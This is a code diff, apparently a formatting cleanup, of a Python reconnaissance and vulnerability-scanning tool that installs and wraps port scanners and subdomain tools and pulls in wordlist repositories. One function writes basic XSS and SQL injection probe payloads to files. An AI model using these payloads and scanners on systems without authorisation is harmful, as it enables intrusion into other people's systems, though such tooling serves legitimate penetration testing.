gobuster\",\n         \"dirb\": \"apt-get update && apt-get install -y dirb\",\n@@ -3412,49 +4279,60 @@\n         \"curl\": \"apt-get update && apt-get install -y curl\",\n         \"wget\": \"apt-get update && apt-get install -y wget\",\n     }\n \n     @staticmethod\n-\n-    def get_available_tool(primary_tool: str, alternatives: List[str] = None) -> Optional[str]:\n+    def get_available_tool(\n+        primary_tool: str, alternatives: List[str] = None\n+    ) -> Optional[str]:\n         \"\"\"Get the first available tool from primary + alternatives\"\"\"\n         if which(primary_tool):\n             return primary_tool\n \n         # Try configured alternatives\n-        alt_tools = alternatives or EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(primary_tool, [])\n+        alt_tools = alternatives or EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(\n+            primary_tool, []\n+        )\n \n         for alt_tool in alt_tools:\n             if which(alt_tool):\n-                logger.log(f\"Using fallback tool '{alt_tool}' instead of '{primary_tool}'\", \"INFO\")\n+                logger.log(\n+                    f\"Using fallback tool '{alt_tool}' instead of '{primary_tool}'\",\n+                    \"INFO\",\n+                )\n                 return alt_tool\n \n-        logger.log(f\"No available alternatives for '{primary_tool}'. Alternatives tried: {alt_tools}\", \"WARNING\")\n+        logger.log(\n+            f\"No available alternatives for '{primary_tool}'. Alternatives tried: {alt_tools}\",\n+            \"WARNING\",\n+        )\n         return None\n \n     @staticmethod\n-\n     def install_tool(tool_name: str) -> bool:\n         \"\"\"Attempt to install a missing tool\"\"\"\n         install_cmd = EnhancedToolFallbackManager.INSTALLATION_COMMANDS.get(tool_name)\n \n         if not install_cmd:\n-            logger.log(f\"No installation command available for '{tool_name}'\", \"WARNING\")\n+            logger.log(\n+                f\"No installation command available for '{tool_name}'\", \"WARNING\"\n+            )\n             return False\n \n         logger.log(f\"Attempting to install '{tool_name}'...\", \"INFO\")\n \n         try:\n             # SECURITY FIX: Parse command safely instead of using shell=True\n             import shlex\n+\n             install_args = shlex.split(install_cmd)\n             result = subprocess.run(\n                 install_args,\n                 shell=False,  # SECURITY: Never use shell=True\n                 capture_output=True,\n                 text=True,\n-                timeout=300  # 5 minute timeout\n+                timeout=300,  # 5 minute timeout\n             )\n \n             if result.returncode == 0:\n                 logger.log(f\"Successfully installed '{tool_name}'\", \"SUCCESS\")\n                 return True\n@@ -3467,12 +4345,13 @@\n         except Exception as e:\n             logger.log(f\"Installation error for '{tool_name}': {e}\", \"ERROR\")\n             return False\n \n     @staticmethod\n-\n-    def ensure_tool_available(tool_name: str, auto_install: bool = False) -> Optional[str]:\n+    def ensure_tool_available(\n+        tool_name: str, auto_install: bool = False\n+    ) -> Optional[str]:\n         \"\"\"Ensure a tool is available, with fallback and optional auto-install\"\"\"\n         # First check if primary tool is available\n         if which(tool_name):\n             return tool_name\n \n@@ -3487,20 +4366,21 @@\n         if available_tool:\n             return available_tool\n \n         # If auto-install enabled, try installing alternatives\n         if auto_install:\n-            alternatives = EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(tool_name, [])\n+            alternatives = EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(\n+                tool_name, []\n+            )\n             for alt_tool in alternatives:\n                 logger.log(f\"Attempting to install alternative '{alt_tool}'...\", \"INFO\")\n                 if EnhancedToolFallbackManager.install_tool(alt_tool):\n                     return alt_tool\n \n         return None\n \n     @staticmethod\n-\n     def get_tool_status() -> Dict[str, Dict[str, Any]]:\n         \"\"\"Get comprehensive status of all tools\"\"\"\n         status = {}\n \n         all_tools = set(EnhancedToolFallbackManager.TOOL_ALTERNATIVES.keys())\n@@ -3508,20 +4388,33 @@\n             all_tools.update(alternatives)\n \n         for tool in sorted(all_tools):\n             status[tool] = {\n                 \"available\": which(tool),\n-                \"alternatives\": EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(tool, []),\n-                \"available_alternatives\": [alt for alt in EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(tool, []) if which(alt)],\n-                \"installable\": tool in EnhancedToolFallbackManager.INSTALLATION_COMMANDS\n+                \"alternatives\": EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(\n+                    tool, []\n+                ),\n+                \"available_alternatives\": [\n+                    alt\n+                    for alt in EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(\n+                        tool, []\n+                    )\n+                    if which(alt)\n+                ],\n+                \"installable\": tool\n+                in EnhancedToolFallbackManager.INSTALLATION_COMMANDS,\n             }\n \n         return status\n \n     @staticmethod\n-\n-    def run_with_fallback(primary_tool: str, command_args: List[str], alternatives: List[str] = None, **kwargs) -> Optional[subprocess.CompletedProcess]:\n+    def run_with_fallback(\n+        primary_tool: str,\n+        command_args: List[str],\n+        alternatives: List[str] = None,\n+        **kwargs,\n+    ) -> Optional[subprocess.CompletedProcess]:\n         \"\"\"Run command with automatic fallback to alternative tools\"\"\"\n         available_tool = EnhancedToolFallbackManager.ensure_tool_available(primary_tool)\n \n         if not available_tool:\n             logger.log(f\"No available tool found for '{primary_tool}'\", \"ERROR\")\n@@ -3536,47 +4429,58 @@\n             return result\n         except Exception as e:\n             logger.log(f\"Failed to run {available_tool}: {e}\", \"ERROR\")\n             return None\n \n+\n # Update which function to use the fallback manager\n def get_best_available_tool(tool_name: str) -> Optional[str]:\n     \"\"\"Get the best available tool including fallbacks\"\"\"\n     return EnhancedToolFallbackManager.ensure_tool_available(tool_name)\n \n+\n # ---------- Dependency validation ----------\n def _check_python_version() -> bool:\n     \"\"\"Check if Python version meets requirements\"\"\"\n     python_version = sys.version_info\n-    if python_version.major < 3 or (python_version.major == 3 and python_version.minor < 9):\n-        logger.log(f\"Python 3.9+ required, found {python_version.major}.{python_version.minor}\", \"ERROR\")\n+    if python_version.major < 3 or (\n+        python_version.major == 3 and python_version.minor < 9\n+    ):\n+        logger.log(\n+            f\"Python 3.9+ required, found {python_version.major}.{python_version.minor}\",\n+            \"ERROR\",\n+        )\n         return False\n     return True\n+\n \n def _check_python_packages() -> List[str]:\n     \"\"\"Check optional Python packages and return missing ones\"\"\"\n     missing_packages = []\n \n     packages_to_check = {\n         \"psutil\": \"System monitoring\",\n         \"distro\": \"OS detection\",\n-        \"requests\": \"HTTP operations\"\n+        \"requests\": \"HTTP operations\",\n     }\n \n     for package, description in packages_to_check.items():\n         try:\n             __import__(package)\n             logger.log(f\"{package} available for {description.lower()}\", \"DEBUG\")\n         except ImportError:\n             missing_packages.append(package)\n \n     if missing_packages:\n-        logger.log(f\"Optional packages missing: {', '.join(missing_packages)}\", \"WARNING\")\n+        logger.log(\n+            f\"Optional packages missing: {', '.join(missing_packages)}\", \"WARNING\"\n+        )\n         logger.log(\"Install with: pip3 install \" + \" \".join(missing_packages), \"INFO\")\n         logger.log(\"Or run: pip3 install -r requirements.txt\", \"INFO\")\n \n     return missing_packages\n+\n \n def _get_security_tools_config() -> Dict[str, str]:\n     \"\"\"Get configuration for security tools and their install commands\"\"\"\n     return {\n         # Core recon tools\n@@ -3605,17 +4509,28 @@\n         \"xssstrike\": \"pip3 install xssstrike\",\n         \"nmap\": \"apt install nmap\",\n         \"dirsearch\": \"pip3 install dirsearch\",\n         \"paramspider\": \"go install github.com/devanshbatham/paramspider@latest\",\n         \"arjun\": \"pip3 install arjun\",\n-        \"dalfox\": \"go install github.com/hahwul/dalfox/v2@latest\"\n+        \"dalfox\": \"go install github.com/hahwul/dalfox/v2@latest\",\n     }\n+\n \n def _check_security_tools() -> Tuple[List[str], List[Tuple[str, str]], int]:\n     \"\"\"Check security tools availability\"\"\"\n     tools = _get_security_tools_config()\n-    core_tools = [\"subfinder\", \"httpx\", \"naabu\", \"nuclei\", \"katana\", \"gau\", \"ffu\", \"nmap\", \"sqlmap\"]\n+    core_tools = [\n+        \"subfinder\",\n+        \"httpx\",\n+        \"naabu\",\n+        \"nuclei\",\n+        \"katana\",\n+        \"gau\",\n+        \"ffu\",\n+        \"nmap\",\n+        \"sqlmap\",\n+    ]\n \n     available_tools = []\n     missing_tools = []\n \n     for tool, install_cmd in tools.items():\n@@ -3634,14 +4549,19 @@\n         logger.log(\"Missing security tools:\", \"WARNING\")\n         for tool, install_cmd in missing_tools:\n             if tool in core_tools:\n                 logger.log(f\"  \\033[91m{tool}\\033[0m (CORE): {install_cmd}\", \"WARNING\")\n             else:\n-                logger.log(f\"  \\033[93m{tool}\\033[0m (ENHANCED): {install_cmd}\", \"WARNING\")\n-        logger.log(\"Run the install.sh script to automatically install missing tools\", \"INFO\")\n+                logger.log(\n+                    f\"  \\033[93m{tool}\\033[0m (ENHANCED): {install_cmd}\", \"WARNING\"\n+                )\n+        logger.log(\n+            \"Run the install.sh script to automatically install missing tools\", \"INFO\"\n+        )\n \n     return available_tools, missing_tools, core_available\n+\n \n def _check_essential_tools() -> bool:\n     \"\"\"Check essential system tools\"\"\"\n     essential_tools = [\"git\", \"wget\", \"unzip\", \"curl\", \"dig\", \"whois\"]\n     missing_essential = []\n@@ -3649,15 +4569,20 @@\n     for tool in essential_tools:\n         if not which(tool):\n             missing_essential.append(tool)\n \n     if missing_essential:\n-        logger.log(f\"Essential system tools missing: {', '.join(missing_essential)}\", \"ERROR\")\n-        logger.log(\"Please install missing system tools using your package manager\", \"ERROR\")\n+        logger.log(\n+            f\"Essential system tools missing: {', '.join(missing_essential)}\", \"ERROR\"\n+        )\n+        logger.log(\n+            \"Please install missing system tools using your package manager\", \"ERROR\"\n+        )\n         return False\n \n     return True\n+\n \n def validate_dependencies() -> bool:\n     \"\"\"Validate all dependencies and provide helpful error messages\"\"\"\n     logger.log(\"Validating dependencies...\", \"INFO\")\n \n@@ -3681,26 +4606,32 @@\n         logger.log(\"Install Go to enable automatic tool installation\", \"WARNING\")\n \n     logger.log(\"Dependency validation completed\", \"SUCCESS\")\n     return core_available >= 4  # Require at least 4 core tools\n \n+\n def check_and_setup_environment():\n     \"\"\"Check environment and provide setup guidance if needed\"\"\"\n     issues_found = []\n \n     # Check if we're in the right directory\n     script_dir = Path(__file__).resolve().parent\n-    if not (script_dir / \"p4nth30n.cfg.json\").exists() and not (script_dir / \"targets.txt\").exists():\n-        issues_found.append(\"Configuration files missing. Run from the correct directory.\")\n+    if (\n+        not (script_dir / \"p4nth30n.cfg.json\").exists()\n+        and not (script_dir / \"targets.txt\").exists()\n+    ):\n+        issues_found.append(\n+            \"Configuration files missing. Run from the correct directory.\"\n+        )\n \n     # Check PATH for Go tools\n     go_bin_path = Path.home() / \"go\" / \"bin\"\n     if go_bin_path.exists():\n         path_env = os.environ.get(\"PATH\", \"\")\n         if str(go_bin_path) not in path_env:\n             issues_found.append(f\"Go tools directory not in PATH: {go_bin_path}\")\n-            logger.log(\"Add to PATH: export PATH=\\\"{go_bin_path}:$PATH\\\"\", \"INFO\")\n+            logger.log('Add to PATH: export PATH=\"{go_bin_path}:$PATH\"', \"INFO\")\n \n     # Check write permissions\n     try:\n         test_file = script_dir / \".write_test\"\n         test_file.touch()\n@@ -3714,33 +4645,46 @@\n             logger.log(f\"  - {issue}\", \"WARNING\")\n         return False\n \n     return True\n \n+\n # ---------- Resource monitor ----------\n def get_system_resources() -> Dict[str, float]:\n     try:\n         import psutil  # type: ignore\n+\n         return {\n             \"cpu\": float(psutil.cpu_percent(interval=0.2)),\n             \"memory\": float(psutil.virtual_memory().percent),\n             \"disk\": float(psutil.disk_usage(str(HERE)).percent),\n         }\n     except Exception:\n         # Fallback best-effort (Linux only)\n         try:\n-            cpu_usage = float(subprocess.check_output(\n-                [\"bash\", \"-lc\", \"grep 'cpu ' /proc/stat | awk '{u=($2+$4)*100/($2+$4+$5)} END {print u}'\"]\n-            ).decode().strip())\n+            cpu_usage = float(\n+                subprocess.check_output(\n+                    [\n+                        \"bash\",\n+                        \"-lc\",\n+                        \"grep 'cpu ' /proc/stat | awk '{u=($2+$4)*100/($2+$4+$5)} END {print u}'\",\n+                    ]\n+                )\n+                .decode()\n+                .strip()\n+            )\n             lines = subprocess.check_output([\"free\", \"-m\"]).decode().splitlines()\n             total, used = list(map(int, lines[1].split()[1:3]))\n             memory_usage = (used / total) * 100\n-            disk_line = subprocess.check_output([\"d\", \"-h\", str(HERE)]).decode().splitlines()[1]\n+            disk_line = (\n+                subprocess.check_output([\"d\", \"-h\", str(HERE)]).decode().splitlines()[1]\n+            )\n             disk_usage = float(disk_line.split()[4].replace(\"%\", \"\"))\n             return {\"cpu\": cpu_usage, \"memory\": memory_usage, \"disk\": disk_usage}\n         except Exception:\n             return {\"cpu\": 0.0, \"memory\": 0.0, \"disk\": 0.0}\n+\n \n def resource_monitor(cfg: Dict[str, Any], stop_event: threading.Event):\n     \"\"\"Monitor system resources and throttle when necessary\"\"\"\n     monitor_interval = cfg.get(\"resource_management\", {}).get(\"monitor_interval\", 5)\n     cpu_threshold = cfg.get(\"resource_management\", {}).get(\"cpu_threshold\", 80)\n@@ -3749,26 +4693,34 @@\n \n     while not stop_event.is_set():\n         try:\n             r = get_system_resources()\n             if r:  # Only log if we got valid resource data\n-                logger.log(f\"Resources CPU:{r['cpu']:.1f}% MEM:{r['memory']:.1f}% DISK:{r['disk']:.1f}%\", \"DEBUG\")\n+                logger.log(\n+                    f\"Resources CPU:{r['cpu']:.1f}% MEM:{r['memory']:.1f}% DISK:{r['disk']:.1f}%\",\n+                    \"DEBUG\",\n+                )\n \n                 # Check thresholds and throttle if necessary\n-                if (r[\"cpu\"] > cpu_threshold or\n-                    r[\"memory\"] > memory_threshold or\n-                    r[\"disk\"] > disk_threshold):\n-                    logger.log(\"High resource usage, throttling operations...\", \"WARNING\")\n+                if (\n+                    r[\"cpu\"] > cpu_threshold\n+                    or r[\"memory\"] > memory_threshold\n+                    or r[\"disk\"] > disk_threshold\n+                ):\n+                    logger.log(\n+                        \"High resource usage, throttling operations...\", \"WARNING\"\n+                    )\n                     time.sleep(monitor_interval * 2)\n                 else:\n                     time.sleep(monitor_interval)\n             else:\n                 # Fallback if resource monitoring fails\n                 time.sleep(monitor_interval)\n         except Exception as e:\n             logger.log(f\"Resource monitoring error: {e}\", \"WARNING\")\n             time.sleep(monitor_interval)\n+\n \n # ---------- External sources ----------\n def git_clone_or_pull(url: str, dest: Path):\n     if dest.exists() and (dest / \".git\").exists():\n         try:\n@@ -3783,10 +4735,11 @@\n         run_cmd([\"git\", \"clone\", \"--depth\", \"1\", url, str(dest)], timeout=1200)\n         logger.log(f\"Cloned repo: {url}\", \"SUCCESS\")\n     except Exception as e:\n         logger.log(f\"git clone failed for {url}: {e}\", \"ERROR\")\n \n+\n def direct_zip_download(url: str, dest: Path):\n     # Try both main and master branches for GitHub\n     cands = []\n     if url.endswith(\".git\") and \"github.com\" in url:\n         base = url[:-4].replace(\"github.com\", \"codeload.github.com\")\n@@ -3794,19 +4747,26 @@\n     else:\n         cands = [url]\n     for u in cands:\n         try:\n             zip_path = dest.with_suffix(\".zip\")\n-            run_cmd([\"wget\", \"-q\", \"-O\", str(zip_path), u], timeout=300, check_return=True)\n+            run_cmd(\n+                [\"wget\", \"-q\", \"-O\", str(zip_path), u], timeout=300, check_return=True\n+            )\n             extract_path = dest.parent / dest.stem\n             extract_path.mkdir(exist_ok=True)\n-            run_cmd([\"unzip\", \"-o\", str(zip_path), \"-d\", str(extract_path)], timeout=600, check_return=True)\n+            run_cmd(\n+                [\"unzip\", \"-o\", str(zip_path), \"-d\", str(extract_path)],\n+                timeout=600,\n+                check_return=True,\n+            )\n             logger.log(f\"Downloaded+extracted {u} -> {extract_path}\", \"SUCCESS\")\n             return True\n         except Exception as e:\n             logger.log(f\"Direct download failed {u}: {e}\", \"WARNING\")\n     return False\n+\n \n def refresh_external_sources(cfg: Dict[str, Any]) -> Dict[str, Path]:\n     sources = {\n         \"SecLists\": EXT_DIR / \"SecLists\",\n         \"PayloadsAllTheThings\": EXT_DIR / \"PayloadsAllTheThings\",\n@@ -3819,19 +4779,23 @@\n         \"Wordlists\": EXT_DIR / \"Probable-Wordlists\",\n         \"AdditionalWordlists\": EXT_DIR / \"commonspeak2-wordlists\",\n         \"OneListForAll\": EXT_DIR / \"OneListForAll\",\n         \"WebDiscoveryWordlists\": EXT_DIR / \"fuzz.txt\",\n         \"XSSPayloads\": PAYLOADS_DIR / \"xss-payload-list\",\n-        \"SQLIPayloads\": PAYLOADS_DIR / \"sql-injection-payload-list\"\n+        \"SQLIPayloads\": PAYLOADS_DIR / \"sql-injection-payload-list\",\n     }\n \n     for name, path in sources.items():\n         url = cfg[\"repos\"].get(name)\n         if not url:\n             continue\n         git_clone_or_pull(url, path)\n-        if not path.exists() and cfg[\"fallback\"][\"enabled\"] and cfg[\"fallback\"][\"direct_downloads\"]:\n+        if (\n+            not path.exists()\n+            and cfg[\"fallback\"][\"enabled\"]\n+            and cfg[\"fallback\"][\"direct_downloads\"]\n+        ):\n             logger.log(f\"Trying direct download fallback for {name}\", \"WARNING\")\n             direct_zip_download(url, path)\n \n     # Special handling for nuclei templates\n     if which(\"nuclei\"):\n@@ -3841,56 +4805,74 @@\n         except Exception as e:\n             logger.log(f\"Failed to update nuclei templates: {e}\", \"WARNING\")\n \n     return sources\n \n+\n def get_best_wordlist(category: str) -> Optional[Path]:\n     \"\"\"Get the best available wordlist for a given category\"\"\"\n     wordlist_mapping = {\n         \"directories\": [\n             MERGED_DIR / \"directories_merged.txt\",\n-            EXT_DIR / \"SecLists\" / \"Discovery\" / \"Web-Content\" / \"directory-list-2.3-medium.txt\",\n+            EXT_DIR\n+            / \"SecLists\"\n+            / \"Discovery\"\n+            / \"Web-Content\"\n+            / \"directory-list-2.3-medium.txt\",\n             EXT_DIR / \"SecLists\" / \"Discovery\" / \"Web-Content\" / \"common.txt\",\n             EXT_DIR / \"OneListForAll\" / \"onelistforall.txt\",\n-            EXTRA_DIR / \"paths_extra.txt\"\n+            EXTRA_DIR / \"paths_extra.txt\",\n         ],\n         \"files\": [\n             MERGED_DIR / \"files_merged.txt\",\n-            EXT_DIR / \"SecLists\" / \"Discovery\" / \"Web-Content\" / \"raft-medium-files.txt\",\n+            EXT_DIR\n+            / \"SecLists\"\n+            / \"Discovery\"\n+            / \"Web-Content\"\n+            / \"raft-medium-files.txt\",\n             EXT_DIR / \"SecLists\" / \"Discovery\" / \"Web-Content\" / \"common.txt\",\n-            EXT_DIR / \"fuzz.txt\" / \"fuzz.txt\"\n+            EXT_DIR / \"fuzz.txt\" / \"fuzz.txt\",\n         ],\n         \"parameters\": [\n             MERGED_DIR / \"params_merged.txt\",\n-            EXT_DIR / \"SecLists\" / \"Discovery\" / \"Web-Content\" / \"burp-parameter-names.txt\",\n-            EXTRA_DIR / \"params_extra.txt\"\n+            EXT_DIR\n+            / \"SecLists\"\n+            / \"Discovery\"\n+            / \"Web-Content\"\n+            / \"burp-parameter-names.txt\",\n+            EXTRA_DIR / \"params_extra.txt\",\n         ],\n         \"subdomains\": [\n             MERGED_DIR / \"subdomains_merged.txt\",\n-            EXT_DIR / \"SecLists\" / \"Discovery\" / \"DNS\" / \"subdomains-top1million-110000.txt\",\n-            EXT_DIR / \"commonspeak2-wordlists\" / \"subdomains\" / \"subdomains.txt\"\n+            EXT_DIR\n+            / \"SecLists\"\n+            / \"Discovery\"\n+            / \"DNS\"\n+            / \"subdomains-top1million-110000.txt\",\n+            EXT_DIR / \"commonspeak2-wordlists\" / \"subdomains\" / \"subdomains.txt\",\n         ],\n         \"xss\": [\n             PAYLOADS_DIR / \"xss-payload-list\" / \"Intruder\" / \"xss-payload-list.txt\",\n             EXT_DIR / \"PayloadsAllTheThings\" / \"XSS Injection\" / \"README.md\",\n-            EXTRA_DIR / \"exploit_payloads.txt\"\n+            EXTRA_DIR / \"exploit_payloads.txt\",\n         ],\n         \"sqli\": [\n             PAYLOADS_DIR / \"sql-injection-payload-list\" / \"sqli-blind.txt\",\n             EXT_DIR / \"PayloadsAllTheThings\" / \"SQL Injection\" / \"README.md\",\n-            EXT_DIR / \"SecLists\" / \"Fuzzing\" / \"SQLi\" / \"quick-SQLi.txt\"\n-        ]\n+            EXT_DIR / \"SecLists\" / \"Fuzzing\" / \"SQLi\" / \"quick-SQLi.txt\",\n+        ],\n     }\n \n     wordlists = wordlist_mapping.get(category, [])\n \n     for wordlist in wordlists:\n         if wordlist.exists() and wordlist.stat().st_size > 0:\n             return wordlist\n \n     logger.log(f\"No wordlist found for category: {category}\", \"WARNING\")\n     return None\n+\n \n def create_enhanced_payloads():\n     \"\"\"Create enhanced payload collections for various attack types\"\"\"\n     PAYLOADS_DIR.mkdir(exist_ok=True)\n \n@@ -3912,15 +4894,15 @@\n         \"<textarea onfocus=alert('XSS') autofocus>\",\n         \"<details open ontoggle=alert('XSS')>\",\n         \"<marquee onstart=alert('XSS')>\",\n         \"'><svg/onload=alert('XSS')>\",\n         \"\\\"><img/src/onerror=alert('XSS')>\",\n-        \"<script>alert(String.fromCharCode(88,83,83))</script>\"\n+        \"<script>alert(String.fromCharCode(88,83,83))</script>\",\n     ]\n \n-    with open(xss_payloads_dir / \"basic_xss.txt\", 'w') as f:\n-        f.write('\\n'.join(xss_payloads))\n+    with open(xss_payloads_dir / \"basic_xss.txt\", \"w\") as f:\n+        f.write(\"\\n\".join(xss_payloads))\n \n     # SQLi payloads\n     sqli_payloads_dir = PAYLOADS_DIR / \"sqli\"\n     sqli_payloads_dir.mkdir(exist_ok=True)\n \n@@ -3942,15 +4924,15 @@\n         \"1 OR 1=1--\",\n         \"1 OR 1=1/*\",\n         \"' UNION SELECT NULL--\",\n         \"' UNION SELECT NULL,NULL--\",\n         \"' UNION SELECT NULL,NULL,NULL--\",\n-        \"'; WAITFOR DELAY '00:00:10'--\"\n+        \"'; WAITFOR DELAY '00:00:10'--\",\n     ]\n \n-    with open(sqli_payloads_dir / \"basic_sqli.txt\", 'w') as f:\n-        f.write('\\n'.join(sqli_payloads))\n+    with open(sqli_payloads_dir / \"basic_sqli.txt\", \"w\") as f:\n+        f.write(\"\\n\".join(sqli_payloads))\n \n     # Nuclei custom payloads\n     nuclei_payloads_dir = PAYLOADS_DIR / \"nuclei\"\n     nuclei_payloads_dir.mkdir(exist_ok=True)\n \n@@ -3978,14 +4960,20 @@\n           - \"git\"\n           - \"admin\"\n           - \"phpMyAdmin\"\n \"\"\"\n \n-    with open(nuclei_payloads_dir / \"custom-template.yaml\", 'w') as f:\n+    with open(nuclei_payloads_dir / \"custom-template.yaml\", \"w\") as f:\n         f.write(custom_template)\n \n-def merge_wordlists(seclists_path: Path, payloads_path: Path, probable_wordlists_path: Path, additional_paths: Dict[str, Path] = None):\n+\n+def merge_wordlists(\n+    seclists_path: Path,\n+    payloads_path: Path,\n+    probable_wordlists_path: Path,\n+    additional_paths: Dict[str, Path] = None,\n+):\n     \"\"\"Efficiently merge wordlists with memory optimization\"\"\"\n     logger.log(\"Merging wordlists...\", \"INFO\")\n     MERGED_DIR.mkdir(parents=True, exist_ok=True)\n \n     def _collect_wordlist_files(base_paths: List[Path]) -> List[Path]:\n@@ -3997,30 +4985,36 @@\n                     for f in files:\n                         if f.endswith((\".txt\", \".dic\", \".lst\")):\n                             file_path = Path(root) / f\n                             # Skip very large files to avoid memory issues\n                             try:\n-                                if file_path.stat().st_size > 100 * 1024 * 1024:  # 100MB limit\n-                                    logger.log(f\"Skipping large file: {file_path}\", \"WARNING\")\n+                                if (\n+                                    file_path.stat().st_size > 100 * 1024 * 1024\n+                                ):  # 100MB limit\n+                                    logger.log(\n+                                        f\"Skipping large file: {file_path}\", \"WARNING\"\n+                                    )\n                                     continue\n                             except OSError:\n                                 continue\n                             all_files.append(file_path)\n         return all_files\n \n     def _process_wordlist_file(fp: Path, uniq: set, max_lines: int = 100000) -> int:\n         \"\"\"Process a single wordlist file with limits\"\"\"\n         lines_processed = 0\n         try:\n-            with open(fp, 'r', encoding=\"utf-8\", errors=\"ignore\") as f:\n+            with open(fp, \"r\", encoding=\"utf-8\", errors=\"ignore\") as f:\n                 for line in f:\n                     if lines_processed >= max_lines:\n                         logger.log(f\"Line limit reached for {fp}, stopping\", \"DEBUG\")\n                         break\n \n                     s = line.strip()\n-                    if s and not s.startswith(\"#\") and 3 <= len(s) <= 100:  # Reasonable length limits\n+                    if (\n+                        s and not s.startswith(\"#\") and 3 <= len(s) <= 100\n+                    ):  # Reasonable length limits\n                         uniq.add(s)\n                         lines_processed += 1\n \n             return lines_processed\n         except Exception as e:\n@@ -4040,11 +5034,13 @@\n     total_processed = 0\n     max_total_lines = 1000000  # 1M line limit to prevent memory issues\n \n     for fp in all_files:\n         if total_processed >= max_total_lines:\n-            logger.log(f\"Total line limit reached ({max_total_lines}), stopping\", \"WARNING\")\n+            logger.log(\n+                f\"Total line limit reached ({max_total_lines}), stopping\", \"WARNING\"\n+            )\n             break\n \n         processed = _process_wordlist_file(fp, uniq, max_lines=50000)\n         total_processed += processed\n \n@@ -4053,262 +5049,472 @@\n             logger.log(\"Unique items limit reached, stopping merge\", \"WARNING\")\n             break\n \n     merged_file = MERGED_DIR / \"all_merged_wordlist.txt\"\n     atomic_write(merged_file, \"\\n\".join(sorted(uniq)))\n-    logger.log(f\"Merged {len(uniq)} unique lines from {len(all_files)} files -> {merged_file}\", \"SUCCESS\")\n+    logger.log(\n+        f\"Merged {len(uniq)} unique lines from {len(all_files)} files -> {merged_file}\",\n+        \"SUCCESS\",\n+    )\n+\n \n # ---------- Run Management ----------\n+\n \n class RunData:\n     \"\"\"Simple container for run information\"\"\"\n \n     def __init__(self, run_dir: Path, run_name: str = None):\n         self.run_dir = run_dir\n         self.run_name = run_name or run_dir.name\n         self.targets_list = None\n+\n \n def new_run() -> Path:\n     run_id = datetime.now().strftime(\"%Y%m%d_%H%M%S\") + \"_\" + str(uuid.uuid4())[:8]\n     run_dir = RUNS_DIR / run_id\n     run_dir.mkdir(parents=True, exist_ok=True)\n     logger.log(f\"Created run: {run_dir}\", \"INFO\")\n     return run_dir\n \n+\n def start_run(run_type: str) -> Tuple[RunData, Dict[str, str]]:\n     \"\"\"Initialize a run with proper data structures\"\"\"\n-    run_id = datetime.now().strftime(\"%Y%m%d_%H%M%S\") + \"_\" + run_type + \"_\" + str(uuid.uuid4())[:8]\n+    run_id = (\n+        datetime.now().strftime(\"%Y%m%d_%H%M%S\")\n+        + \"_\"\n+        + run_type\n+        + \"_\"\n+        + str(uuid.uuid4())[:8]\n+    )\n     run_dir = RUNS_DIR / run_id\n     run_dir.mkdir(parents=True, exist_ok=True)\n \n     rd = RunData(run_dir, run_type)\n     env = env_with_lists()\n \n     logger.log(f\"Created {run_type} run: {run_dir}\", \"INFO\")\n     return rd, env\n+\n \n def env_with_lists() -> Dict[str, str]:\n     env = os.environ.copy()\n     env[\"P4NTH30N_MERGED_WORDLISTS\"] = str(MERGED_DIR)\n     env[\"P4NTH30N_PAYLOADS\"] = str(PAYLOADS_DIR)\n     env[\"P4NTH30N_EXPLOITS\"] = str(EXPLOITS_DIR)\n     return env\n \n+\n # ---------- Tool wrappers ----------\n def run_subfinder(domain: str, out_file: Path, env: Dict[str, str]):\n     if not which(\"subfinder\"):\n         logger.log(\"subfinder not found, skipping\", \"WARNING\")\n         return\n-    run_cmd([\"subfinder\", \"-d\", domain, \"-silent\", \"-o\", str(out_file), \"-all\"], env=env, timeout=600, check_return=False)\n+    run_cmd(\n+        [\"subfinder\", \"-d\", domain, \"-silent\", \"-o\", str(out_file), \"-all\"],\n+        env=env,\n+        timeout=600,\n+        check_return=False,\n+    )\n+\n \n def run_amass(domain: str, out_file: Path, env: Dict[str, str]):\n     if not which(\"amass\"):\n         logger.log(\"amass not found, skipping\", \"WARNING\")\n         return\n     # Passive mode first (faster, lighter)\n-    run_cmd([\"amass\", \"enum\", \"-d\", domain, \"-o\", str(out_file), \"-passive\"], env=env, timeout=1200, check_return=False)\n+    run_cmd(\n+        [\"amass\", \"enum\", \"-d\", domain, \"-o\", str(out_file), \"-passive\"],\n+        env=env,\n+        timeout=1200,\n+        check_return=False,\n+    )\n+\n \n def run_naabu(host: str, out_file: Path, rps: int, env: Dict[str, str]):\n     if not which(\"naabu\"):\n         logger.log(\"naabu not found, skipping\", \"WARNING\")\n         return\n-    run_cmd([\"naabu\", \"-host\", host, \"-p\", \"-\", \"-rate\", str(rps), \"-o\", str(out_file), \"-silent\"], env=env, timeout=1200, check_return=False)\n+    run_cmd(\n+        [\n+            \"naabu\",\n+            \"-host\",\n+            host,\n+            \"-p\",\n+            \"-\",\n+            \"-rate\",\n+            str(rps),\n+            \"-o\",\n+            str(out_file),\n+            \"-silent\",\n+        ],\n+        env=env,\n+        timeout=1200,\n+        check_return=False,\n+    )\n+\n \n def run_masscan(host: str, out_file: Path, rps: int, env: Dict[str, str]):\n     if not which(\"masscan\"):\n         logger.log(\"masscan not found, skipping\", \"WARNING\")\n         return\n-    run_cmd([\"masscan\", host, \"-p\", \"1-65535\", \"--rate\", str(rps), \"-oG\", str(out_file)], env=env, timeout=1800, check_return=False)\n+    run_cmd(\n+        [\"masscan\", host, \"-p\", \"1-65535\", \"--rate\", str(rps), \"-oG\", str(out_file)],\n+        env=env,\n+        timeout=1800,\n+        check_return=False,\n+    )\n+\n \n def run_httpx(input_file: Path, out_file: Path, env: Dict[str, str], http_timeout: int):\n     if not which(\"httpx\"):\n         logger.log(\"httpx not found, skipping\", \"WARNING\")\n         return\n-    run_cmd([\n-        \"httpx\", \"-l\", str(input_file), \"-o\", str(out_file),\n-        \"-silent\", \"-follow-redirects\",\n-        \"-mc\", \"200,201,202,204,301,302,303,307,308,401,403,405,500\",\n-        \"-json\", \"-title\", \"-tech-detect\", \"-sc\", \"-timeout\", str(http_timeout),\n-        \"-server\", \"-cdn\", \"-pipeline\", \"-headers\"\n-    ], env=env, timeout=1200, check_return=False)\n-\n-def run_gobuster(target: str, wordlist: Path, out_file: Path, extensions: str, env: 